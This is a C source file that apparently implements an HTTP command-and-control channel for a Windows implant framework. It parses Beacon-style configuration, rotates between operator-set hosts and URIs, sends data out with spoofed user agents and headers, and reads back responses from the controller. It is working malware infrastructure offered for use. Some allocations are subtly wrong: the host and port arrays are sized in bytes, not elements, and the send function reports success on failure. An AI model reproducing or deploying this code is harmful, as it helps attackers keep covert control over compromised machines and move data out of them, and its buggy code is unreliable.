#include "channel.h"
#include "imports.h"
#include <heapapi.h>
#include <string.h>
#include <winnt.h>

#ifdef _DEBUG
#define DBG_PRINTF( x, ... ) dprintf( "[HTTP CHANNEL]: " x, ##__VA_ARGS__ )
#else
#define DBG_PRINTF( x, ... )
#endif

BOOL HttpSend( CHANNEL_CONTEXT* Context, CONST CHAR* Data, DWORD Size, BOOL Register ) {
    DWORD     dwRead    = 0;
    DWORD     dwTotal   = 0;
    HANDLE    hHeap     = GetProcessHeap();
    CHAR*     Buffer    = NULL;
    CHAR*     Chunk     = NULL;
    DWORD     ChunkSize = 4096;
    HINTERNET hSession  = NULL;
    HINTERNET hRequest  = NULL;
    HINTERNET hConnect  = NULL;

    Context->Data = NULL;
    Context->Size = 0;

    Buffer = (CHAR*)RtlAllocateHeap( hHeap, HEAP_ZERO_MEMORY, 1 );
    if (!Buffer) {
        DBG_PRINTF( "failed to allocate memory for Buffer\n" );
        return FALSE;
    }

    Chunk = (CHAR*)RtlAllocateHeap( hHeap, HEAP_ZERO_MEMORY, 4096 );
    if (!Chunk) {
        DBG_PRINTF( "failed to allocate memory for Chunk\n" );
        return FALSE;
    }

    if (!( hSession = InternetOpenA(
               Context->Config.UserAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 ) )) {
        DBG_PRINTF( "InternetOpenA failed: ( %d )\n", GetLastError() );
        return FALSE;
    }

    // rotation strategy
    if (Context->Config.RotationStrategy) {
        Context->Config.HostIndex = Context->Config.HostIndex % Context->Config.HostsCount;
        Context->Config.UriIndex  = Context->Config.UriIndex % Context->Config.UrisCount;
    } else {
        Context->Config.HostIndex = 0;
        Context->Config.UriIndex  = 0;
    }

    if (!( hConnect = InternetConnectA(
               hSession,
               Context->Config.Hosts[Context->Config.HostIndex],
               Context->Config.Ports[Context->Config.HostIndex],
               NULL,
               NULL,
               INTERNET_SERVICE_HTTP,
               0,
               0 ) )) {
        DBG_PRINTF( "InternetConnectA failed ( %d )\n", GetLastError() );
        goto cleanup;
    }

    if (!( hRequest = HttpOpenRequestA(
               hConnect,
               Context->Config.Method,
               Context->Config.Uris[Context->Config.UriIndex],
               NULL,
               NULL,
               NULL,
               INTERNET_FLAG_RELOAD,
               0 ) )) {
        DBG_PRINTF( "HttpOpenRequestA failed: ( %d )\n", GetLastError() );
        goto cleanup;
    }

    // add http headers
    for (int i = 0; i < Context->Config.HeadersCount; i++) {
        if (!HttpAddRequestHeadersA(
                hRequest,
                Context->Config.Headers[i],
                -1,
                HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE )) {
            DBG_PRINTF( "failed to add header: %s\n", Context->Config.Headers[i] );
        }
    }

    if (!HttpSendRequestA( hRequest, NULL, 0, (LPVOID)Data, Size )) {
        DBG_PRINTF( "HttpSendRequestA failed ( %d )\n", GetLastError() );
        goto cleanup;
    }

    DBG_PRINTF(
        "sent %d bytes to %s:%d\n",
        Size,
        Context->Config.Hosts[Context->Config.HostIndex],
        Context->Config.Ports[Context->Config.HostIndex] );

    do {
        memset( Chunk, 0, ChunkSize );

        if (!InternetReadFile( hRequest, Chunk, ChunkSize - 1, &dwRead )) {
            break;
        }

        if (dwRead > 0) {
            Buffer =
                (CHAR*)RtlReAllocateHeap( hHeap, HEAP_ZERO_MEMORY, Buffer, dwTotal + dwRead + 1 );
            memcpy( Buffer + dwTotal, Chunk, dwRead );
            dwTotal += dwRead;
        }

    } while (dwRead > 0);

    Context->Data = Buffer;
    Context->Size = dwTotal;

    DBG_PRINTF( "received %d bytes\n", dwTotal );

cleanup:
    if (Chunk)
        RtlFreeHeap( hHeap, 0, Chunk );

    if (hRequest)
        InternetCloseHandle( hRequest );
    if (hConnect)
        InternetCloseHandle( hConnect );
    if (hSession)
        InternetCloseHandle( hSession );
    return TRUE;
}

BOOL HttpReceive( CHANNEL_CONTEXT* Context, CHAR** Data, DWORD* Size ) {
    *Data = Context->Data;
    *Size = Context->Size;
    return TRUE;
}

BOOL HttpInitialize( CHANNEL_CONTEXT* Context ) { return TRUE; }

BOOL HttpCleanup( CHANNEL_CONTEXT* Context ) {
    RtlFreeHeap( GetProcessHeap(), 0, Context );
    return TRUE;
}

BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) {
    datap            Parser;
    CHANNEL_CONTEXT* Context = NULL;
    char**           Uris    = NULL;
    char**           Headers = NULL;
    char**           Hosts   = NULL;
    unsigned short*  Ports   = NULL;

    Context = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL_CONTEXT ) );
    if (Context == NULL) {
        goto RETURN_WITH_FAILURE;
    }

    Implant->BeaconDataParse( &Parser, Config, ConfigSize );
    Context->Config.ID               = Implant->BeaconDataInt( &Parser );
    Context->Config.UserAgent        = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
    Context->Config.Method           = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
    Context->Config.RotationStrategy = Implant->BeaconDataShort( &Parser );
    Context->Config.UrisCount        = Implant->BeaconDataShort( &Parser );
    Context->Config.HeadersCount     = Implant->BeaconDataShort( &Parser );
    Context->Config.HostsCount       = Implant->BeaconDataShort( &Parser );

    DBG_PRINTF( "id.................: %d", Context->Config.ID );
    DBG_PRINTF( "user agent.........: %s", Context->Config.UserAgent );
    DBG_PRINTF( "method.............: %s", Context->Config.Method );
    DBG_PRINTF( "rotation strategy..: %d", Context->Config.RotationStrategy );
    DBG_PRINTF( "hosts count........: %d", Context->Config.HostsCount );
    DBG_PRINTF( "uris count.........: %d", Context->Config.UrisCount );
    DBG_PRINTF( "headers count......: %d", Context->Config.HeadersCount );

    // parser hosts
    //
    Hosts = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, Context->Config.HostsCount );
    Ports = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, Context->Config.HostsCount );
    if (!Hosts || !Ports) {
        goto RETURN_WITH_FAILURE;
    }

    for (int i = 0; i < Context->Config.HostsCount; i++) {
        Hosts[i] = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
        Ports[i] = Implant->BeaconDataShort( &Parser );

        DBG_PRINTF( "host %d............: %s:%d", i, Hosts[i], Ports[i] );
    }

    // parse header
    //
    Headers = RtlAllocateHeap(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( char* ) * Context->Config.HeadersCount );
    if (!Headers) {
        DBG_PRINTF( "failed to allocate memory with RtlAllocateHeap\n" );
        goto RETURN_WITH_FAILURE;
    }

    for (int i = 0; i < Context->Config.HeadersCount; i++) {
        Headers[i] = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );

        DBG_PRINTF( "header %d..........: %s", i, Headers[i] );
    }

    // parse uris
    //
    Uris = RtlAllocateHeap(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( char* ) * Context->Config.UrisCount );
    if (!Uris) {
        DBG_PRINTF( "failed to allocate memory with RtlAllocateHeap\n" );
        goto RETURN_WITH_FAILURE;
    }

    for (int i = 0; i < Context->Config.UrisCount; i++) {
        Uris[i] = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );

        DBG_PRINTF( "uri %d.............: %s", i, Uris[i] );
    }

    Context->Config.Hosts     = Hosts;
    Context->Config.Ports     = Ports;
    Context->Config.Headers   = Headers;
    Context->Config.Uris      = Uris;
    Context->Config.HostIndex = 0;
    Context->Config.UriIndex  = 0;

    Channel->ID          = Context->Config.ID;
    Channel->Initialize  = HttpInitialize;
    Channel->Send        = HttpSend;
    Channel->Receive     = HttpReceive;
    Channel->Cleanup     = HttpCleanup;
    Channel->Context     = Context;
    Channel->ContextSize = sizeof( CHANNEL_CONTEXT );

    DBG_PRINTF( "channel %X registred\n", Context->Config.ID );

    return TRUE;

RETURN_WITH_FAILURE:
    if (Context)
        RtlFreeHeap( GetProcessHeap(), 0, Context );
    if (Uris)
        RtlFreeHeap( GetProcessHeap(), 0, Uris );
    if (Headers)
        RtlFreeHeap( GetProcessHeap(), 0, Headers );

    return FALSE;
}
